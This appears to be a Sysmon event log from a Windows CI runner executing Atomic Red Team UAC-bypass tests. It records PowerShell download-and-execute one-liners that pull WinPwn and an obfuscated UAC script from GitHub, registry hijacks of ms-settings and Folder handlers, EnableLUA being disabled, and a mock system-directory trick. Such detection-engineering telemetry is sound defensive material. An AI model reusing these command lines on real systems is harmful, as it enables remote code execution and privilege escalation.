FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:38 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:37.650
ProcessGuid: {f995aebf-639d-6942-0306-000000000e00}
ProcessId: 10228
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52190
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:38 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:37.644
ProcessGuid: {f995aebf-639d-6942-0306-000000000e00}
ProcessId: 10228
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:38 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:36.507
ProcessGuid: {f995aebf-639c-6942-0106-000000000e00}
ProcessId: 7120
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:38 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:36.511
ProcessGuid: {f995aebf-639c-6942-0106-000000000e00}
ProcessId: 7120
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52189
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:38 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:02:38.573
ProcessGuid: {f995aebf-639e-6942-0506-000000000e00}
ProcessId: 6388
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:38.354
ProcessGuid: {f995aebf-639e-6942-0506-000000000e00}
ProcessId: 6388
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_om0xs1ay.zq1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:38.263
ProcessGuid: {f995aebf-639e-6942-0506-000000000e00}
ProcessId: 6388
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique DiskCleanup}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:02:37.656
ProcessGuid: {f995aebf-639d-6942-0306-000000000e00}
ProcessId: 10228
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:37.437
ProcessGuid: {f995aebf-639d-6942-0306-000000000e00}
ProcessId: 10228
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xpclc2tk.2wl.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:37 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:37.345
ProcessGuid: {f995aebf-639d-6942-0306-000000000e00}
ProcessId: 10228
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\calc.exe\"""" -technique ccmstp}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:02:36.518
ProcessGuid: {f995aebf-639c-6942-0106-000000000e00}
ProcessId: 7120
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:36.296
ProcessGuid: {f995aebf-639c-6942-0106-000000000e00}
ProcessId: 7120
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_l5rvwyai.5ly.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:36.194
ProcessGuid: {f995aebf-639c-6942-0106-000000000e00}
ProcessId: 7120
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique magic}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:34 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:34.030
ProcessGuid: {f995aebf-639a-6942-ee05-000000000e00}
ProcessId: 9592
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-6399-6942-e905-000000000e00}
ParentProcessId: 6756
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1548.002\src\T1548.002.bat""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:33 AM","13","Registry value set:
RuleName: T1548.002
EventType: SetValue
UtcTime: 2025-12-17 08:02:33.689
ProcessGuid: {f995aebf-6399-6942-e805-000000000e00}
ProcessId: 8660
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
Details: DWORD (0x00000000)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:30 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:30.346
ProcessGuid: {f995aebf-6395-6942-e405-000000000e00}
ProcessId: 2144
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open\command\DelegateExecute
Details: (Empty)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:30 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:30.214
ProcessGuid: {f995aebf-6395-6942-e405-000000000e00}
ProcessId: 2144
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open\command\(Default)
Details: cmd.exe /c notepad.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:30 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:02:30.214
ProcessGuid: {f995aebf-6395-6942-e405-000000000e00}
ProcessId: 2144
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open\command
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:30 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:02:30.214
ProcessGuid: {f995aebf-6395-6942-e405-000000000e00}
ProcessId: 2144
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:30 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:02:30.214
ProcessGuid: {f995aebf-6395-6942-e405-000000000e00}
ProcessId: 2144
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:30 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:30.025
ProcessGuid: {f995aebf-6395-6942-e405-000000000e00}
ProcessId: 2144
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3pz2uczw.2le.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:29 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:29.667
ProcessGuid: {f995aebf-6395-6942-e305-000000000e00}
ProcessId: 2864
Image: C:\Program Files (x86)\Google\GoogleUpdater\143.0.7482.0\updater.exe
ImageLoaded: C:\Windows\SysWOW64\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=11B9FF7634BD6D54CD72A7C679682DABB30F6F0BC0BA5BAE2D3EE2CE3CEA73D2
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:29 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:29.612
ProcessGuid: {f995aebf-6395-6942-e005-000000000e00}
ProcessId: 4964
Image: C:\Program Files (x86)\Google\GoogleUpdater\143.0.7482.0\updater.exe
ImageLoaded: C:\Windows\SysWOW64\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=11B9FF7634BD6D54CD72A7C679682DABB30F6F0BC0BA5BAE2D3EE2CE3CEA73D2
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:29 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:29.529
ProcessGuid: {f995aebf-6395-6942-df05-000000000e00}
ProcessId: 1152
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:29 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:29.518
ProcessGuid: {f995aebf-6395-6942-e105-000000000e00}
ProcessId: 9428
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c mkdir ""\\?\C:\Windows \System32\"" & copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" & mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:29 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:29.376
ProcessGuid: {f995aebf-6395-6942-dd05-000000000e00}
ProcessId: 3172
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:29 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:29.374
ProcessGuid: {f995aebf-6395-6942-de05-000000000e00}
ProcessId: 9220
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:29 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:29.179
ProcessGuid: {f995aebf-6394-6942-d905-000000000e00}
ProcessId: 3068
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:29 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:29.173
ProcessGuid: {f995aebf-6394-6942-d905-000000000e00}
ProcessId: 3068
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\DelegateExecute
Details: (Empty)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:28.824
ProcessGuid: {f995aebf-6394-6942-d905-000000000e00}
ProcessId: 3068
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_41ntd24p.4j4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:28 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:28.677
ProcessGuid: {f995aebf-6394-6942-d805-000000000e00}
ProcessId: 4172
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:28 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:28.534
ProcessGuid: {f995aebf-6394-6942-d605-000000000e00}
ProcessId: 7936
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:28 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:28.532
ProcessGuid: {f995aebf-6394-6942-d705-000000000e00}
ProcessId: 9712
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:28 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:28.363
ProcessGuid: {f995aebf-6393-6942-d205-000000000e00}
ProcessId: 1212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:28 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:28.357
ProcessGuid: {f995aebf-6393-6942-d205-000000000e00}
ProcessId: 1212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\DelegateExecute
Details: (Empty)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:28.049
ProcessGuid: {f995aebf-6393-6942-d205-000000000e00}
ProcessId: 1212
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ja0onyws.tbg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
